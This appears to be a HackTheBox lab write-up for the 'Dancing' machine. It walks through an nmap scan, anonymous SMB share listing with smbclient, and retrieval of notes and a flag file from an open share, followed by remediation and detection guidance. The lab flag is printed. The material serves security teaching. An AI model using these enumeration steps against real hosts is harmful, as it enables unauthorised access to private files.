# Dancing (HTB) - Unauthenticated SMB Share Enumeration & Data Leakage

**Platform:** HackTheBox (Starting Point) | **Target OS:** Windows Server  
**Focus:** SMB Protocol Architecture (Port 445/TCP), Share Permissions vs. NTFS ACLs, Null Session Enumeration, and Operational Intelligence Leakage  

---

## 🎯 Executive Summary
The "Dancing" target hosts a Windows Server exposing Server Message Block (SMB) services on Ports 139/TCP and 445/TCP. An architectural misconfiguration in SMB Access Control Lists (ACLs) permitted unauthenticated null sessions to enumerate custom non-standard shares (`WorkShares`). This allowed arbitrary remote users to navigate internal user directories (`Amy.J`, `James.P`) and exfiltrate confidential operational notes and administrative flags.

---

## 1. Network Reconnaissance & Service Fingerprinting

We executed a fast TCP SYN scan (`-sS`) targeting the top 100 ports to profile active Windows management and networking services.

```bash
$ sudo nmap -sS -sV -T4 --top-ports 100 10.129.58.251
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.129.58.251
Host is up (0.16s latency).
Not shown: 97 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Technical Analysis:**
- **Port 135/TCP (MSRPC):** Microsoft Remote Procedure Call endpoint mapper.
- **Port 139/TCP (NetBIOS-SSN):** NetBIOS Session Service (legacy transport layer for SMB).
- **Port 445/TCP (Microsoft-DS):** Direct SMB over TCP/IP without requiring NetBIOS framing. This port is the primary attack vector for share enumeration, credential harvesting, and remote code execution vectors.

---

## 2. Share Enumeration & Access Control Testing

Using `smbclient`, we queried the target's SMB service with a null session (supplying a blank password) to list available shares via the `-L` flag.

```bash
$ smbclient -L 10.129.58.251
Password for [WORKGROUP\hacker]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
SMB1 disabled -- no workgroup available
```

### Access Control List (ACL) Testing
We evaluated access permissions across the enumerated shares using Universal Naming Convention (UNC) paths (`\\10.129.58.251\ShareName`):

```bash
$ smbclient \\\\10.129.58.251\\ADMIN$
Password for [WORKGROUP\hacker]:
tree connect failed: NT_STATUS_ACCESS_DENIED

$ smbclient \\\\10.129.58.251\\C$
Password for [WORKGROUP\hacker]:
tree connect failed: NT_STATUS_ACCESS_DENIED

$ smbclient \\\\10.129.58.251\\WorkShares
Password for [WORKGROUP\hacker]:
Try "help" to get a list of possible commands.
smb: \>
```

**Security Analysis:**
- `ADMIN$` and `C$` represent default Windows Administrative Shares. Access was correctly blocked (`NT_STATUS_ACCESS_DENIED`) as these require local administrator privileges.
- `WorkShares` is a custom user-defined share. Due to permissive Share ACLs, null session requests were accepted, granting an interactive SMB shell.

---

## 3. Operational Intelligence & Data Exfiltration

Upon connecting to `WorkShares`, we navigated the directory tree using standard SMB interactive commands (`cd`, `ls`, `get`).

```text
smb: \> ls
  Amy.J                               D        0  Mon Mar 29 10:22:01 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

smb: \> cd Amy.J
smb: \Amy.J\> ls
  worknotes.txt                       A       94  Fri Mar 26 13:00:37 2021
smb: \Amy.J\> get worknotes.txt
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt

smb: \Amy.J\> cd ..\James.P
smb: \James.P\> ls
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt
smb: \James.P\> exit
```

Reading the exfiltrated local artifacts:

```bash
$ cat worknotes.txt
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing

$ cat flag.txt
5f61c10dffbc77a704d76016a22f1664
```

**Intelligence Analysis:**
The file `worknotes.txt` leaks internal operational tradecraft:
1. Indicates a multi-homed or broader network environment involving a Linux Apache server and an FTP server.
2. Mentions setting up **WinRM** (Windows Remote Management - Port 5985/5986) on the `Dancing` host, highlighting a potential future administration vector.

---

## 4. OS Internals: Windows Share Permissions vs. NTFS Permissions

To understand why `WorkShares` was accessible without authentication, we must dissect the Windows dual-layer permission model:

```text
[Incoming SMB Client Request]
          │
          ▼
┌───────────────────────────┐
│   Share Permissions       │  <-- Evaluated First (Set via SMB Protocol)
│   (e.g., Everyone: Read)  │  <-- FAILED in ADMIN$, PASSED in WorkShares
└─────────┬─────────────────┘
          │
          ▼
┌───────────────────────────┐
│   NTFS Permissions        │  <-- Evaluated Second (Set via OS File System)
│   (ACLs on Folder/File)   │  <-- Determines final Access/Read rights
└───────────────────────────┘
```

1. **Null Session (Anonymous Logon):** By default in legacy or misconfigured Windows domains, unauthenticated clients can establish an IPC SMB session.
2. **Share ACL vs. NTFS ACL Flaw:** The administrator configured the SMB Share permissions for `WorkShares` to allow `Everyone` or `ANONYMOUS LOGON` read rights. Even if NTFS permissions were intact, the permissive Share ACL allowed the SMB daemon (`lsass.exe` / `srv2.sys`) to process the `TREE_CONNECT` request successfully without requesting user credentials.

---

## 5. Defensive Remediation & Detection Engineering

### 1. Hardening & Mitigation
- **Restrict Anonymous SMB Access:** Enable Group Policy to prevent anonymous share enumeration:
  - Navigation: `Computer Configuration -> Windows Settings -> Security Settings -> Local Policies -> Security Options`
  - Policy: `Network access: Restrict anonymous access to Named Pipes and Shares` -> **Enabled**
  - Policy: `Network access: Do not allow anonymous enumeration of SAM accounts and shares` -> **Enabled**
- **Audit Share Permissions:** Remove `Everyone` and `ANONYMOUS LOGON` from custom share ACLs. Restrict access explicitly to authenticated domain security groups (e.g., `Domain Users`).

### 2. Detection Engineering
- **Windows Event Logs (Security Event ID 5140 & 5145):** Monitor for network share objects accessed by anonymous or guest accounts:
  - **Event ID 5140:** *A network share object was accessed.*
  - **Event ID 5145:** *A network share object was checked to see whether client can be granted desired access.*
  - Filter for `SubjectSecurityID: S-1-5-7` (`ANONYMOUS LOGON`) or `S-1-5-32-546` (`Guests`).
